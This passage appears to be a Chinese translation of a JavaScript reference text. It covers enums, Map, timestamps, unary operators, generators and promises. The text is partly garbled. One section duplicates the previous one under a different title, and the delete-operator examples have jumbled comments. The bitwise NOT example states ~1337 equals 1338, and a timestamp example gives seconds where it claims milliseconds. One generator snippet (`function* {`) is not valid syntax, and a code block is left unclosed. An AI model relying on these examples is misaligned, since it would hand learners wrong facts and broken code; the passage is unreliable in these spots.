  \ 防止枚举被修改\nconst TestEnum = Object.freeze({\n  One: 1,\n  Two: 2,\n  Three: 3\n\
  });\n\n// 定义一个值来自枚举的变量\nvar x = TestEnum.Two;\n\n// 根据变量的枚举值进行打印\nswitch (x) {\n\
  \  case TestEnum.One:\n    console.log(\"111\");\n    break;\n  case TestEnum.Two:\n\
  \    console.log(\"222\");\n}\n```\n\n上述枚举定义也可以写如下所示：\n\n```javascript\nvar TestEnum\
  \ = { One: 1, Two: 2, Three: 3 } Object.freeze(TestEnum);\n```\n\n此后你可以你可以定义变量并像之前一样进行打印。\n\
  \n#### 章节 37.2：替代定义\n\n`Object.freeze()` 方法自 5.1 版本起可用。对于旧版本，你可以使用以下代码（注意它在 5.1\
  \ 及此后的版本中同样有效）：\n\n```javascript\nvar ColorsEnum = {\n  WHITE: 0,\n  GRAY: 1,\n\
  \  BLACK: 2\n}\n\n// 定义一个值来自枚举的变量\nvar currentColor = ColorsEnum.GRAY;\n```\n\n\
  #### 章节 37.3：打印\n\n`Object.freeze()` 方法自 5.1 版本起可用。对于旧版本，你可以使用以下代码（注意它在 5.1 及此后的版本中同样有效）：\n\
  \n```javascript\nvar ColorsEnum = {\n  WHITE: 0,\n  GRAY: 1,\n  BLACK: 2\n}\n\n\
  // 定义一个值来自枚举的变量\nvar currentColor = ColorsEnum.GRAY;\n```\n\n#### 章节 37.4：使用 Symbols\
  \ 实现枚举\n\n由于 ES6 引入了 `Symbols`，它们既是唯一的又是不可变的，可以作为键来代替字符串。\n\n```javascript\n// 简单的符号\n\
  const newSymbol = Symbol();\n// typeof newSymbol === 'symbol' // true\n\n// 带有标签的符号\n\
  const anotherSymbol = Symbol(\"label\");\n// anotherSymbol === newSymbol // false\n\
  \n// 每个符号都是唯一的\nconst yetSymbol = Symbol();\n// yetSymbol === anotherSymbol // false\n\
  ```\n\n#### 章节 37.5：自动枚举值\n\n这演示了如何为枚举中的每个条目自动赋值。这可以防止两个枚举具有相同的值。\n\n```javascript\n\
  var testEnum = function() {\n  // 初始化枚举\n  var enumList = [\n    \"One\",\n    \"\
  Two\",\n    \"Three\"\n  ];\n  enumObj = {};\n  enumList.forEach((item, index) =>\
  \ enumObj[item] = index + 1);\n  // 不允许对象被修改\n  Object.freeze(enumObj);\n  return\
  \ enumObj;\n}();\n\nconsole.log(testEnum.One); // 将打印 1\n```\n\n### 章节 38：Map\n\n\
  #### 参数详情\n\n- `iterable`: 任何包含 `[key, value]` 键对的可迭代对象（例如数组）。\n- `key`: 元素的键。\n\
  - `value`: 分配给键的值。\n- `callback`: 回调函数，调用时带有三个参数：value、key 和 map 本。\n- `thisArg`:\
  \ 执行回调函数时用作 `this` 的值。\n\n#### 章节 38.1：创建 Map\n\n`Map` 是一种从键到值的基元映射。`Map` 与对象（object）的区别在于，`Map`\
  \ 的键可以是任何类型（包括原始类型值以及对象），而不仅仅是字符串和符号。`Map` 的迭代始终按照项目插入到 Map 中的顺序进行的，而在迭代对象的键时，顺序是未定义的。\n\
  \n要创建一个 `Map`，请使用 `Map` 构造函数：\n\n```javascript\nconst map = new Map();\n```\n\n\
  它有一个可选参数，该参数可以是任何可迭代对象（例如数组），该对象包含包含两个元素的数组——第一个是键，第二个是值。例如：\n\n```javascript\n\
  const map = new Map([[new Date(), {foo: \"bar\"}], [document.body, \"body\"]]);\n\
  ```\n\n\n\n\n\n### 第 38.2 ：清除 Map\n\n要移除 Map 中的所有元素，请使用 `.clear()` 方法：\n\n```javascript\n\
  map.clear();\n```\n\n示例：\n\n```javascript\nconst map = new Map([[1, 2], [3, 4]]);\n\
  console.log(map.size); // 2\nmap.clear();\nconsole.log(map.size); // 0\nconsole.log(map.get(1));\
  \ // undefined\n```\n\n### 第 38.3 ：从 Map 中删除元素\n\n要从 map 中删除元素，使用 `.delete()` 方法。\n\
  \n```javascript\nmap.delete(key);\n```\n\n示例：\n\n```javascript\nconst map = new\
  \ Map([[1, 2], [3, 4]]);\nconsole.log(map.get(3)); // 4\nmap.delete(3);\nconsole.log(map.get(3));\
  \ // undefined\n```\n\n如果元素存在并已删除，该方法返回 `true`，否则返回 `false`：\n\n```javascript\n\
  const map = new Map([[1, 2], [3, 4]]);\nconsole.log(map.delete(1)); // true\nconsole.log(map.delete(7));\
  \ // false\n```\n\n### 第 38.4 ：检查 Map 中是否存在键\n\n要检查 Map 中是否存在某个键，使用 `.has()` 方法：\n\
  \n```javascript\nmap.has(key);\n```\n\n示例：\n\n```javascript\nconst map = new Map([[1,\
  \ 2], [3, 4]]);\nconsole.log(map.has(1)); // true\nconsole.log(map.has(2)); // false\n\
  ```\n\n### 第 38.5 ：遍历 Map\n\nMap 有三个返回迭代器的方法：`.keys()`、`.values()` 和 `.entries()`。`.entries()`\
  \ 是默认的 Map 迭代器，包含 `[key, value]` 键对。\n\n```javascript\nconst map = new Map([[1,\
  \ 2], [3, 4]]);\nfor (const [key, value] of map) {\n  console.log(`key: ${key},\
  \ value: ${value}`);\n  // 日志:\n  // key: 1, value: 2\n  // key: 3, value: 4\n}\n\
  for (const key of map.keys()) {\n  console.log(key); // 打印 1 和 3\n}\nfor (const\
  \ value of map.values()) {\n  console.log(value); // 打印 2 和 4\n}\n```\n\nMap 还有\
  \ `.forEach()` 方法。第一个参数是回调函数，它会为 map 中的每个元素调用一次，第二个参数是值，它在执行回调函数时将用 `this` 使用。\n\
  \n回调函数有三个参数：`value`、`key` 和 `map` 对象。\n\n```javascript\nconst map = new Map([[1,\
  \ 2], [3, 4]]);\nmap.forEach((value, key, theMap) => console.log(`key: ${key}, value:\
  \ ${value}`));\n// 日志:\n// key: 1, value: 2\n// key: 3, value: 4\n```\n\n### 第 38.6\
  \ ：获取和设置元素\n\n使用 `.get(key)` 根据键获取值，使用 `.set(key, value)` 为键赋值值。\n\n如果 map 中不存在指定的键，`.get()`\
  \ 返回 `undefined`。`.set()` 方法返回 map 对象，因此你可以链式调用 `.set()`。\n\n```javascript\nconst\
  \ map = new Map();\nconsole.log(map.get(1)); // undefined\nmap.set(1, 2).set(3,\
  \ 4);\nconsole.log(map.get(1)); // 2\n```\n\n### 第 38.7 ：获取 Map 的元素数量\n\n要获取 Map\
  \ 的元素数量，请使用 `.size` 属性：\n\n```javascript\nconst map = new Map([[1, 2], [3, 4]]);\n\
  console.log(map.size); // 2\n```\n\n## 第 39 章：时间戳\n\n### 第 39.1：高精度时间戳\n\n`performance.now()`\
  \ 返回一个精确的时间戳：自当前网页开始加载以来经过的毫秒数，包括微秒。\n\n更通地说，它返回自 `performanceTiming.navigationStart`\
  \ 事件以来经过的时间。\n\n```javascript\nt = performance.now();\n```\n\n例如，在 浏览器的主上下文中，如果网页在\
  \ 6288 毫秒 319 微秒前开始加载，`performance.now()` 将返回 `6288.319`。\n\n### 第 39.2：获取秒时间戳\n\
  \n要获取秒级的时间戳：\n\n```javascript\nMath.floor((new Date().getTime()) / 1000)\n```\n\n\
  ### 第 39.3：低精度时间戳\n\n`Date.now()` 返回自 1970 年 1 月 1 日 00:00:00 UTC 以来经过的整数毫秒数。\n\n\
  ```javascript\nt = Date.now();\n```\n\n例如，如果在 2016 年 4 月 19 日 12:35:14 GMT 调用 `Date.now()`\
  \ 将返回 `1461069314`。\n\n### 第 39.4：对旧版浏览的支持\n\n在不支持 `Date.now()` 的旧浏览器中，请使用 `(new\
  \ Date()).getTime()` 代替：\n\n```javascript\nt = (new Date()).getTime();\n```\n\n\
  或者，为了给旧浏览器提供 `Date.now()` 函数，可以使用此 polyfill（垫片）：\n\n```javascript\nif (!Date.now)\
  \ {\n  Date.now = function now() {\n    return new Date().getTime();\n  };\n}\n\n\
  ## 第 40 章：一元运算符\n\n### 第 40.1：概述\n\n一元运算符是仅有一个操作数的运算符。一元运算符比标准的 JavaScript 函数调用更高效。此外，一元运算符无法被重写，因此其功能是有保障的。\n\
  \n可用以下一元运算符：\n\n- `delete`：`delete` 运算符从对象中删除属性。\n- `void`：`void` 运算符丢弃表达式的返回值。\n\
  - `typeof`：`typeof` 运算符确定给定对象的类型。\n- `+`：一元加运算符将其操作数转换为 `Number` 类型。\n\n示例：\n\n\
  - 一元否定运算符将其操作数转换为 `Number`，然后对其取反。\n- `~`：按位取反运算符。\n- `!`：逻辑非运算符。\n\n### 第 40.2：typeof\
  \ 运算符\n\n`typeof` 运算符以字符串形式返回未求值操作数的类型。\n\n**语法：**\n\n```javascript\ntypeof operand\n\
  ```\n\n**返回值：**\n\n这些是 `typeof` 可能的返回值：\n\n| 类型 | 返回值 |\n| :--- | :--- |\n| Undefined\
  \ | \"undefined\" |\n| Null | \"object\" |\n| Boolean | \"boolean\" |\n| Number\
  \ | \"number\" |\n| String | \"string\" |\n| Symbol (ES6) | \"symbol\" |\n| Function\
  \ object | \"function\" |\n| document.all | \"undefined\" |\n| Host 对象（由 JS 环境提供）\
  \ | 取决于实现\n| 其他任何对象 | \"object\" |\n\n`document.all` 与 `typeof` 运算符的异常行为源于它过去检测旧版浏览器的用途。更多信息请参阅\
  \ 为什么 document.all 被定义但 typeof document.all 返回 \"undefined\"？\n\n**示例：**\n\n```javascript\n\
  // 返回 'number'\ntypeof 3.14;\ntypeof Infinity;\ntypeof NaN; // \"Not-a-Number\"\
  \ 是一个 \"number\"\n\n// 返回 'string'\ntypeof \"\";\ntypeof \"bla\";\ntypeof (typeof\
  \ 1); // typeof 总是返回字符串\n\n// 返回 'boolean'\ntypeof true;\ntypeof false;\n\n// 返回\
  \ 'undefined'\ntypeof undefined;\ntypeof declaredButUndefined;\ntypeof undeclaredVariable;\n\
  typeof void 0;\ntypeof document.all; //见上\n\n// 返回 'function'\ntypeof function(){};\n\
  typeof class {};\ntypeof Math.sin;\n\n// 返回 'object'\ntypeof {};\ntypeof null;\n\
  typeof /regex/; // 这也被视为对象\ntypeof new Date();\ntypeof new RegExp();\ntypeof Boolean(true);\
  \ // 不要用！\ntypeof Number(1); // 不要用！\ntypeof String(\"abc\"); // 不要用！\n\n// 返回 'symbol'\n\
  typeof Symbol();\ntypeof Symbol.iterator;\n```\n\n### 第 40.3：delete 运算符\n\n`delete`\
  \ 运算符从对象中删除一个属性。\n\n**语法：**\n\n```javascript\ndelete object.property\ndelete object['property']\n\
  ```\n\n**返回值：**\n\n如果删除成功或属性不存在：`true`\n\n如果要删除的属性是对象自身的不可配置属性（无法删除）：非严格模式下返回 `false`。严格模式下抛出错误。\n\
  \n**描述**\n\n`delete` 运算符并不直接释放内存。但如果该操作意味着该属性的所有引用都消失了，则可以间接释放内存。\n\n`delete` 作用于对象的属性。如果对象的原型链上存在同名的属性，则该属性将从原型继承。`delete`\
  \ 不作用于变量或函数名。\n\n**示例：**\n\n```javascript\n// 删除属性\nfoo = 1;\ndelete foo;\nconsole.log(foo);\
  \ // 全局变量是 window 的属性：`window.foo` // true\n// Uncaught ReferenceError: foo is not\
  \ defined\n\n// 删除变量\nvar foo = 1;\ndelete foo;\nconsole.log(foo); // false\n//\
  \ 1 (未删除)\n\n// 删除函数\nfunction foo(){ };\ndelete foo;\nconsole.log(foo); // false\n\
  // function foo(){ } (未删除)\n\n// 删除属性\nvar foo = { bar: \"42\" };\ndelete foo.bar;\n\
  ```\n\n\n\n\n\n`delete` foo.bar; // true\n\n`console.log(foo);` // Object { } (Deleted\
  \ bar)\n\n// 删除不存在的属性\n\n`var` foo = { };\n\n`delete` foo.bar; // true\n\n`console.log(foo);`\
  \ // Object { } (无错误，无内容删除)\n\n// 删除预定义对象的不可配置属性\n`delete` Math.PI; // false ()\n\
  \n`console.log(Math.PI);` // 3.141592653589793 (未删除)\n\n### 第 40.4 节：一元加运算符 (+)\n\
  \n一元加 `+` 位于操作数之前，并求值为操作数的值。它尝试将操作数转换为数字，如果它还没有的话。\n\n**语法：**\n\n```js\n+expression\n\
  ```\n\n**返回值：**\n\n一个数字（Number）。\n\n**描述**\n\n一元加 `+` 运算符是将某些值转换为数字最快（也是首选）的方法。\n\
  \n它可以转换：\n\n- 整数（十进制或十六进制）和浮点数的字符串表示。\n- 布尔值：`true`, `false`。\n- `null`\n\n无法转换的值将求值为\
  \ `NaN`。\n\n**示例：**\n\n```js\n+42 // 42\n+ \"42\" // 42\n+true // 1\n+false // 0\n\
  +null // 0\n+undefined // NaN\n+NaN // NaN\n+\"foo\" // NaN\n+{} // NaN\n+function(){}\
  \ // NaN\n```\n\n注意，尝试转换数组可能会导致意想不到的返回值。在底层，数组首先被转换为它们的字符串表示：\n\n```js\n[] .toString()\
  \ === '';\n[1].toString() === '1'; \n[1, 2].toString() === '1,2';\n```\n\n然后该运算符尝试将这些字符串转换为数字：\n\
  \n```js\n+[] // 0 ( === +'' )\n+[1] // 1 ( === +'1' )\n+[1, 2] // NaN ( === +'1,2'\
  \ )\n```\n\n### 第 40.5 节：void 运算符\n\n`void` 运算符求给定的表达式的值，然后返回 `undefined`。\n\n**语法：**\n\
  \n```js\nvoid expression\n```\n\n**返回值：**\n\n`undefined`\n\n**描述**\n\n`void` 运算符通常用于通过编写\
  \ `void 0` 或 `void(0)` 来获取原始值 `undefined`。注意 `void` 是一个运算符而不是函数，因此不需要 `()`。\n\n\
  通常 `void` 表达式的结果和 `undefined` 可以互换使用。\n\n然而，在旧版本的 ECMAScript 中，`window.undefined`\
  \ 可以被赋值任何值，并且仍然可以在函数内部使用 `undefined` 作为函数参数变量名，从而破坏依赖 `undefined` 值的其他代码。\n\n尽管如此，`void`\
  \ 始终产生真实的 `undefined` 值。\n\n`void 0` 也常用于代码混淆，作为编写 `undefined` 的更短写方式。此外，它可能更安全，因为其他代码可能篡改过\
  \ `window.undefined`。\n\n**示例：**\n\n返回 `undefined`：\n\n```js\nfunction foo(){\n\
  \  return void 0;\n}\nconsole.log(foo()); // undefined\n```\n\n在特定作用域内更改 `undefined`\
  \ 的值：\n\n```js\n(function(undefined){\n  var str = 'foo';\n  console.log(str ===\
  \ undefined); // true\n})('foo');\n```\n\n### 第 40.6 节：一元取反运算符 (-)\n\n一元取反 `-` 位于操作数之前，在尝试将其转换为数字后对其取反。\n\
  \n**语法：**\n\n```js\n-expression\n```\n\n**返回值：**\n\n一个数字（Number）。\n\n**描述**\n\n\
  一元取反 `-` 可以转换与一元加 `+` 运算符相同的类型/值。\n\n无法转换的值将求值为 `NaN`（没有 `-NaN`）。\n\n**示例：**\n\n\
  ```js\n-42 // -42\n-\"42\" // -42\n-true // -1\n-false // -0\n-null // -0\n-undefined\
  \ // NaN\n-NaN // NaN\n-\"foo\" // NaN\n-{} // NaN\n-function(){} // NaN\n```\n\n\
  注意，尝试转换数组可能会导致意想不到的返回值。在底层，数组首先被转换为它们的字符串表示：\n\n```js\n[] .toString() === '';\n\
  [1].toString() === '1'; \n[1, 2].toString() === '1,2';\n```\n\n然后运算符尝试将这些字符串转换为数字：\n\
  \n```js\n-[] // -0 ( === -'' )\n-[1] // -1 ( === -'1' )\n-[1, 2] // NaN ( === -'1,2'\
  \ )\n```\n\n### 第 40.7 节：按位取反运算符 (~)\n\n按位取反 `~` 对值中的每个位执行非 NOT 操作。\n\n**语法：**\n\
  \n```js\n~expression\n```\n\n**返回值：**\n\n一个数字（Number）。\n\n**描述**\n\n非 操作的真值表如下：\n\
  \n`a NOT a`\n0 1\n1 0\n\n1337 (base 10) = 0000010100111001 (base 2)\n`~1337 (base\
  \ 10) = 1111101011000110 (base 2) = 1338 (base 10)\n\n对数字进行按位取反的结果是：`-(x + 1)`。\n\
  \n**示例：**\n\n| value (base 10) | value (base 2) | return (base 2) | return (base\
  \ 10) |\n| :--- | :--- | :--- | :--- |\n| 2 | 00000010 | 11111100 | -3 |\n| 1 |\
  \ 00000001 | 11111110 | -2 |\n| 0 | 00000000 | 11111111 | -1 |\n| -1 | 11111111\
  \ | 00000000 | 0 |\n| -2 | 11111110 | 00000001 | 1 |\n| -3 | 11111100 | 00000010\
  \ | 2 |\n\n### 第 40.8 节：逻辑非运算符 (!)\n\n逻辑非 `!` 对表达式执行逻辑取反。\n\n**语法：**\n\n```js\n\
  !expression\n```\n\n**返回值：**\n\n一个布尔值（Boolean）。\n\n**描述**\n\n逻辑非 `!` 运算符对表达式执行逻辑取反。\n\
  \n布尔值直接反转：`!true === false` 和 `!false === true`。非布尔值先转换为布尔值，然后进行取反。\n\n这意味着双重逻辑非\
  \ `!!` 可以将任何值强制转换为布尔值：\n\n```js\n!! \"FooBar\" === true\n!!1 === true\n!!0 === false\n\
  ```\n\n这些都等于 `!true`：\n\n```js\n! 'true' === !new Boolean('true');\n!'false' ===\
  \ !new Boolean('false');\n!'FooBar' === !new Boolean('FooBar');\n![] === !new Boolean([]);\n\
  !{} === !new Boolean({});\n```\n\n这些都等于 `!false`：\n\n```js\n! 0 === !new Boolean(0);\n\
  !'' === !new Boolean('');\n!NaN === !new Boolean(NaN);\n!null === !new Boolean(null);\n\
  !undefined === !new Boolean(undefined);\n```\n\n**示例：**\n\n```js\n! true // false\n\
  ! 1 // false\n! \"1\" // false\n! 42 // false\n! \"42\" // false\n! \"foo\" // false\n\
  ! \"true\" // false\n! \"false\" // false\n! \"FooBar\" // false\n! [] // true\n\
  ! {} // true\n! function(){} // true\n! undefined // true\n! null // true\n! NaN\
  \ // true\n```\n\n### 第 41 章：生成器 (Generators)\n\n生成器函数（通过 `function*` 关键字定义）作为协程运行，根据迭代器的请求生成一系列值。\n\
  \n#### 第 41.1 节：生成器函数\n\n生成器函数通过 `function*` 声明创建。调用它时，其体不会立即执行。相反，它返回一个生成器对象，该对象可以用于“步进”函数。\n\
  \n函数体内的 `yield` 表达式定义了执行可以暂停和恢复的点。\n\n```js\nfunction* nums() {\n  console.log('starting');\
  \ // A\n  yield 1; // B\n  console.log('yielded 1'); // C\n  yield 2; // D\n  console.log('yielded\
  \ 2'); // E\n  yield 3; // F\n  console.log('yielded 3'); // G\n}\n```\n\n`var generator\
  \ = nums();` // 返回迭代器。nums 中的代码未执行\n\n`generator.next(); // 执行 A,B 返回 { value: 1,\
  \ done: false } // console: \"starting\"\n\n`generator.next(); // 执行 C,D 返回 { value:\
  \ 2, done: false } // console: \"yielded 1\"\n\n`generator.next(); // 执行 E,F 返回\
  \ { value: 3, done: false } // console: \"yielded 2\"\n\n`generator.next(); // 执行\
  \ G 返回 { value: undefined, done: true } // console: \"yielded 3\"\n\n**提前退出迭代**\n\
  \n```js\ngenerator = nums();\ngenerator.next(); // 执行 A,B 返回 { value: 1, done: false\
  \ }\ngenerator.next(); // 执行 C,D 返回 { value: 2, done: false }\ngenerator.return(3);\
  \ // 没有执行代码返回 { value: 3, done: true }\n// 任何后续调用将返回 done = true\ngenerator.next();\
  \ // 没有执行代码返回 { value: undefined, done: true }\n```\n\n**向生成器函数抛出错误**\n\n```js\n\
  function* nums() {\n  try {\n    yield 1; // A\n    yield 2; // B\n    yield 3;\
  \ // C\n  } catch (e) {\n    console.log(e.message); // D\n  }\n}\n\nvar generator\
  \ = nums();\ngenerator.next(); // 执行 A 返回 { value: 1, done: false }\ngenerator.next();\
  \ // 执行 B 返回 { value: 2, done: false }\n```\n\n\n\n\n\n```javascript\ngenerator.throw(new\
  \ Error(\"Error!!\")); // 执行 D 行并返回 { value: undefined, done: true} // console:\
  \ \"Error!!\"\n```\n\n```javascript\ngenerator.next(); // 没有代码执行。返回 { value: undefined,\
  \ done: true }\n```\n\n### 第 41.2 ：向生成器发送值\n\n可以通过向 `next()` 方法传递参数来向生成器发送值。\n\n\
  ```javascript\nfunction* summer() {\n  let sum = 0, value;\n  while (true) {\n \
  \   // 接收传递的值\n    value = yield;\n    if (value === null) break;\n    // 累加值\n\
  \    sum += value;\n  }\n  return sum;\n}\n```\n\n```javascript\nlet generator =\
  \ summer();\n// 继续执行直到第一个 \"yield\" 表达式，忽略 \"value\" 参数\ngenerator.next();\n// 从这里开始，生成器将累加值，直到我们发送\
  \ \"null\"\ngenerator.next(1);\ngenerator.next(10);\ngenerator.next(100);\n// 关闭生成器并收集结果\n\
  let sum = generator.next(null).value; // 111\n```\n\n### 第 41.3 ：委托给其他生成器\n\n在生成器函数内部，可以使用\
  \ `yield*` 将控制权委托给另一个生成器函数。\n\n```javascript\nfunction* g1() {\n  yield 2;\n  yield\
  \ 3;\n  yield 4;\n}\n\nfunction* g2() {\n  yield 1;\n  yield* g1();\n  yield 5;\n\
  }\n```\n\n```javascript\nvar it = g2();\nconsole.log(it.next()); // 1\nconsole.log(it.next());\
  \ // 2\nconsole.log(it.next()); // 3\nconsole.log(it.next()); // 4\nconsole.log(it.next());\
  \ // 5\nconsole.log(it.next()); // undefined\n```\n\n### 第 41.4 ：迭代\n\n生成器是*可迭代的*。它可以使用\
  \ `for...of` 语句进行循环，并用于其他依赖迭代协议的构造结构。\n\n```javascript\nfunction* range(n) {\n \
  \ for (let i = 0; i < n; ++i) {\n    yield i;\n  }\n}\n```\n\n```javascript\n//\
  \ 循环\nfor (let n of range(10)) {\n  // n 获得值 0, 1, ... 9\n}\n```\n\n```javascript\n\
  // 展开运算符\nlet nums = [...range(3)]; // [0, 1, 2]\nlet max = Math.max(...range(100));\
  \ // 99\n```\n\n这是另一个在 ES6 中使用生成器自定义可迭代对象的示例。这里使用了匿名生成器函数 `function*`。\n\n```javascript\n\
  let user = {\n  name: \"sam\",\n  totalReplies: 17,\n  isBlocked: false\n};\n\n\
  user[Symbol.iterator] = function* {\n  let properties = Object.keys(this);\n  let\
  \ count = 0;\n  let isDone = false;\n  for (let p of properties) {\n    yield this[p];\n\
  \  }\n};\n\nfor (let p of user) {\n  console.log(p);\n}\n```\n\n### 第 41.5 ：使用生成器处理异步流\n\
  \n生成器是能够暂停并在之后恢复执行的函数。这允许使用外部库（主要是 `q` 或 `co`）来模拟异步函数。基本上，它允许编写等待异步结果以便继续执行的函数：\n\
  \n```javascript\nfunction someAsyncResult() {\n  return Promise.resolve('newValue')\n\
  }\n```\n\n```javascript\nq.spawn(function* () {\n  var result = yield someAsyncResult()\n\
  \  console.log(result) // 'newValue'\n})\n```\n\n这允许像同步代码一样编写异步代码。此外，`try` 和 `catch`\
  \ 可以跨越异步块工作。如果 Promise 被拒绝，错误将被下一个 `catch` 捕获：\n\n```javascript\nfunction asyncError()\
  \ {\n  return new Promise(function (resolve, reject) {\n    setTimeout(function\
  \ () {\n      reject(new Error('Something went wrong'))\n    }, 100)\n  })\n}\n\
  ```\n\n```javascript\nq.spawn(function* () {\n  try {\n    var result = yield asyncError()\n\
  \  } catch (e) {\n    // 处理错误\n  }\n})\n```\n\n\n\n\n\n当一个 promise 被履行（fulfilled）或拒绝（rejected）时，被认为已经\
  \ `settled`（已定）。一旦 promise 变为已定，它就变得不可变的，其状态无法改变。promise 的 `then` 和 `catch` 方法可以用于附加回调，这些回调在\
  \ promise 定时时执行。这些回调分别通过履行值和拒绝原因调用。\n\n![](img/image00703.jpeg) **示例**\n\n```javascript\n\
  const promise = new Promise((resolve, reject) => {\n  // 执行某些工作（可能是异步的）\n  // ...\n\
  \  if (/* 工作成功完成并生成了 \"value\" */) {\n    resolve(value);\n  } else {\n    // 因为\
  \ \"reason\" 发生了错误\n    // 传统上原因是一个 Error 对象，虽然\n    // 这并不是强制要求或执行的。\n    let reason\
  \ = new Error(message);\n    reject(reason);\n    // 抛出错误也会拒绝 promise\n    throw\
  \ reason;\n  }\n});\n```\n\n`then` 和 `catch` 方法可以用于附加履行和拒绝回调：\n\n```javascript\n\
  promise.then(value => {\n  // 工作成功完成，// promise 已用 \"value\" 履行\n}).catch(reason\
  \ => {\n  // 发生了某些错误，\n  // promise 已用 \"reason\" 拒绝\n});\n```\n\n**注意：** 在同一个 promise\
  \ 上调用 `promise.then(...)` 和 `promise.catch(...)` 如果发生错误，可能会导致 Promise 出现未捕获的异常（无论是在执行\
  \ promise 期间还是在其中一个回调内部），因此首选方法是在之前的 `then` / `catch` 返回的 promise 上附加下一个监听器。\n\n\
  或者，两个回调都可以在单个 `then` 调用中附加：\n\n```javascript\npromise.then(onFulfilled, onRejected);\n\
  ```\n\n向一个已经 set 定的 promise 附加回调将立即把它们放入微任务队列，并且它们将“尽快”被调用（即在当前执行的脚本之后立即执行）。与许多其他事件发射实现不同，在附加回调之前没有必要检查\
  \ promise 的状态。\n\n现场演示\n\n### 章节 42.2：Promise 链\n\npromise 的 `then` 方法返回一个新的 promise。\n\
  \n```javascript\nconst promise = new Promise(resolve => setTimeout(resolve, 5000));\n\
  \npromise\n  // 5 秒后\n  .then(() => 2)\n  // 从 then 回调中返回一个值将导致 // 新 promise 使用该值解析\n\
  \  .then(value => { /* value === 2 */ });\n```\n\n从 `then` 回调返回一个 `Promise` 将将其附加到\
  \ promise 链中。\n\n```javascript\nfunction wait(millis) {\n  return new Promise(resolve\
  \ => setTimeout(resolve, millis));\n}\n\nconst p = wait(5000).then(() => wait(4000)).then(()\
  \ => wait(1000));\np.then(() => { /* 已经过去了 10 秒 */ });\n```\n\n`catch` 允许被拒绝的 promise\
  \ 恢复，类似于 `try`/catch` 语句中 `catch` 的工作方式。`catch` 之后的任何链式 `then` 都将使用从 `catch` 解析的值执行其解析程序。\n\
  \n```javascript\nconst p = new Promise(resolve => {throw 'oh no'});\np.catch(()\
  \ => 'oh yes').then(console.log.bind(console)); // 输出 \"oh yes\"\n```\n\n如果链中间没有\
  \ `catch` 或 `reject` 处理器，末尾的 `catch` 将捕获链中的任何拒绝：\n\n```javascript\np.catch(() =>\
  \ Promise.reject('oh yes'))\n  .then(console.log.bind(console)) // 不会被调用\n  .catch(console.error.bind(console));\
  \ // 输出 \"oh yes\"\n```\n\n在某些情况下，你可能想要“分支”函数的执行。你可以根据条件从函数返回不同的 promise。在代码的后续，你可以将所有这些分支合并为一个，以便在它们上调用其他函数并/或在一个地方处理所有错误。\n\
  \n```javascript\npromise\n  .then(result => {\n    if (result.condition) {\n   \
  \   return handlerFn1().then(handlerFn2);\n    } else if (result.condition2) {\n\
  \      return handlerFn3().then(handlerFn4);\n    } else {\n      throw new Error(\"\
  Invalid result\");\n    }\n  })\n  .then(handlerFn5)\n  .catch(err => {\n    console.error(err);\n\
  \  });\n```\n\n因此，函数的执行顺序看起来如下：\n`promise -> handlerFn1 -> handlerFn2 -> handlerFn5\
  \ ~~> .catch() | ^`\n`V -> handlerFn3 -> handlerFn4 -^`\n\n单个 `catch` 将获取在任何一个分支上发生的错误。\n\
  \n### 章节 42.3：等待多个并发的 promise\n\n`Promise.all()` 静态方法接受一个 promise 迭代器（例如 `Array`）并返回一个新的\
  \ promise，当迭代器中的**所有** promise 都已解析时，该 promise 被解析；如果迭代器中**至少有一个** promise 被拒绝，它就会被拒绝。\n\
  \n```javascript\n// 等待 \"millis\" 毫秒，然后用 \"value\" 解析\nfunction resolve(value, milliseconds)\
  \ {\n  return new Promise(resolve => setTimeout(() => resolve(value), milliseconds));\n\
  }\n\n// 等待 \"millis\" 毫秒，然后用 \"reason\" 拒绝\nfunction reject(reason, milliseconds)\
  \ {\n  return new Promise((_, reject) => setTimeout(() => reject(reason), milliseconds));\n\
  }\n\nPromise.all([\n  resolve(1, 5000),\n  resolve(2, 6000),\n  resolve(3, 7000)\n\
  ]).then(values => console.log(values)); // 7 秒后输出 \"[1, 2, 3]\"\n\nPromise.all([\n\
  \  resolve(1, 5000),\n  reject('Error!', 6000),\n  resolve(2, 7000)\n]).then(values\
  \ => console.log(values)) // 什么都不输出\n  .catch(reason => console.log(reason)); //\
  \ 6 秒后输出 \"Error!\"\n```\n\n迭代器中的非 promise 值会被“promisify 化”。\n\n```javascript\n\
  Promise.all([\n  resolve(1, 5000),\n  resolve(2, 6000),\n  { hello: 3 }\n]).then(values\
  \ => console.log(values)); // 6 秒后输出 \"[1, 2, { hello: 3 }]\"\n```\n\n解构赋值可以帮助从多个\
  \ promise 中取回结果。\n\n```javascript\nPromise.all([\n  resolve(1, 5000),\n  resolve(2,\
  \ 6000),\n  resolve(3, 7000)\n]).then(([result1, result2, result3]) => {\n  console.log(result1);\n\
  \  console.log(result2);\n  console.log(result3);\n});\n```\n\n### 章节 42.4：将数组归约为链式\
  \ promise\n\n这种设计模式适用于从元素列表生成一系列异步操作。有两种变体：`then` 归约，只要链处于成功状态就一直构建链；`catch` 归约，只要链处于错误状态一直构建链。\n\
  \n**`then` 归约**\n该模式的这种变体构建了一个 `then()` 链，可能用于链式动画或执行一系列依赖的 HTTP 请求。\n\n```javascript\n\
  [1, 3, 5, 7, 9].reduce((seq, n) => {\n  return seq.then(() => {\n    console.log(n);\n\
  \    return new Promise(res => setTimeout(res, 1000));\n  });\n}, Promise.resolve()).then(\n\
  \  () => console.log('done'),\n  (e) => console.log(e)\n); // 每隔 1 秒记录 1, 3, 5,\
  \ 7, 9, 'done'\n\n解释：\n1. 我们对源数组调用 `reduce()`，并提供 `Promise.resolve()` 作为初始值。\n2.\
  \ 每一个归约的元素都会向初始值添加一个 `then()`。\n3. `reduce()` 的产将是 `Promise.resolve().then(...).then(...)`。\n\
  4. 我们在 reduce 之后手动附加 `.then(successHandler, errorHandler)`，以便在所有步骤都解析后执行 successHandler。如果任何步骤失败，则会执行\
  \ errorHandler。\n\n**`catch` 归约**\n该模式的这种变体构建了一个 `catch()` 链，可能用于顺序探测一组网络服务器的镜像资源，直到找到工作的服务器。\n\
  \n```javascript\nvar working_resource = 5; // 源数组中的一个值\n\n[1, 3, 5, 7, 9].reduce((seq,\
  \ n) => {\n  return seq.catch(() => {\n    console.log(n);\n    if (n === working_resource)\
  \ { // 5 是工作的\n      return new Promise((resolve, reject) => setTimeout(() => resolve(n),\
  \ 1000));\n    } else { // 其他所有值都不工作\n      return new Promise((resolve, reject)\
  \ => setTimeout(reject, 1000));\n    }\n  });\n}, Promise.reject()).then(\n  (n)\
  \ => console.log('success at: ' + n),\n  () => console.log('total failure')\n);\
